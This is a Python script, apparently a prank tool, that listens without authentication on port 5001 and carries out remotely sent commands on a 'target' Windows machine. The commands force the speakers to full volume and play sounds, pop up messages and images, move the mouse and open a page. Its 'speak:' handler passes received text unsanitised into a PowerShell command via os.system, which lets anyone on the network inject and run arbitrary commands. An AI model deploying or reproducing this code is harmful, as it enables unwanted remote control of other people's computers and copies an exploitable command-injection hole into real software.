import socket
import pygame
import os
import random
import pyautogui
import threading
import webbrowser
import tkinter as tk
from tkinter import Label
from PIL import Image, ImageTk
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL

pygame.mixer.init()

ASSETS_DIR = os.path.join(os.path.dirname(__file__), "assets")

def set_max_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute():
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

def play_sound(name):
    filepath = os.path.join(ASSETS_DIR, "sounds", f"{name}.mp3")
    if os.path.exists(filepath):
        set_max_volume()
        pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
    else:
        print(f"❌ Fichier non trouvé : {filepath}")

def show_emolio_on_target():
    def run():
        emolio_dir = os.path.join(ASSETS_DIR, "emolio")
        emolio_images_list = [f for f in os.listdir(emolio_dir) if f.endswith(".png")]
        if not emolio_images_list:
            print("❌ Aucun fichier Emolio trouvé.")
            return

        filename = random.choice(emolio_images_list)
        filepath = os.path.join(emolio_dir, filename)

        root = tk.Tk()
        root.overrideredirect(True)
        root.attributes("-topmost", True)

        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()

        img = Image.open(filepath)
        img_width, img_height = img.size
        x = random.randint(0, screen_width - img_width)
        y = random.randint(0, screen_height - img_height)

        root.geometry(f"{img_width}x{img_height}+{x}+{y}")
        tk_image = ImageTk.PhotoImage(img)
        label = Label(root, image=tk_image)
        label.image = tk_image
        label.pack()

        root.after(2000, root.destroy)
        root.mainloop()

    threading.Thread(target=run).start()

def open_work_html_on_target():
    filepath = os.path.join(ASSETS_DIR, "work.html")
    if os.path.exists(filepath):
        webbrowser.open(f"file://{filepath}")
    else:
        print(f"❌ Fichier work.html introuvable : {filepath}")

HOST = '0.0.0.0'
PORT = 5001

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("🔌 En attente de connexion...")

    while True:
        conn, addr = s.accept()
        with conn:
            data = conn.recv(1024).decode().strip()
            print(f"📥 Commande reçue : {data}")

            if data.startswith("sound:"):
                sound_name = data.split("sound:")[1]
                play_sound(sound_name)

            elif data.startswith("speak:"):
                text = data.split("speak:")[1]
                os.system(f'powershell "Add-Type –AssemblyName System.Speech; '
                          f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"')

            elif data.startswith("msg:"):
                import ctypes
                msg = data.split("msg:")[1]
                ctypes.windll.user32.MessageBoxW(0, msg, "Message du réseau", 0)

            elif data == "move_mouse":
                try:
                    screen_width, screen_height = pyautogui.size()
                    x = random.randint(0, screen_width)
                    y = random.randint(0, screen_height)
                    pyautogui.moveTo(x, y, duration=0.5)
                    print(f"🖱 Souris déplacée vers ({x}, {y})")
                except Exception as e:
                    print(f"❌ Erreur déplacement souris : {e}")

            elif data == "emolio":
                show_emolio_on_target()

            elif data == "work":
                open_work_html_on_target()
